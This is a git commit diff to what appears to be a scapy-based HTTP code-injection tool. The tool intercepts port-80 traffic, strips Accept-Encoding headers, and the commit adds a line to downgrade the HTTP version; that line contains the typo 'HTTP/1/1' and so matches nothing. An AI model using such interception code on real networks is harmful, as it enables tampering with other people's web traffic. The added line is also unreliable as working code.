3395651424b70ae63d1a67194409b5502864540a
mark <mrkgitonga387@gmail.com>
2024-11-28 10:49:42 +0300

    #CODE INJECTOR

--- Code_Injector.py
+++ Code_Injector.py
@@ -30,6 +30,7 @@ def process_packet(packet):
             if scapy_packet[scapy.TCP].dport == 80:  # HTTP Request
                 print('[+] HTTP Request Intercepted')
                 load = re.sub(r"Accept-Encoding:.*?\r\n", "", load)
+                load = load.replace("HTTP/1/1", "HTTP/1.0")
 
             # Modify HTTP Response
             elif scapy_packet[scapy.TCP].sport == 80:  # HTTP Response
